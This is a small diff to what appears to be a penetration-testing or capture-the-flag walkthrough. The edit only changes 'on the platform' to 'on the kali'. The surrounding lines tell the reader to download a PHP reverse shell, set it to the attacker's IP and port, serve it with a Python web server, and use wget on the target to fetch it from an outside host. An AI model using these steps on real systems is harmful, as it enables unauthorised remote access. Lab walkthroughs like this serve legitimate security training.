@@ -94,7 +94,7 @@ https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-rev
 
 Download and edit the php reverse shell for point your ip and port.
 
-`python3 -m http.server 8090` <- on the platform
+`python3 -m http.server 8090` <- on the kali
 
 `wget http://192.168.196.121:8090/php-reverse-shell.php` <- on the target for rev shell download
 
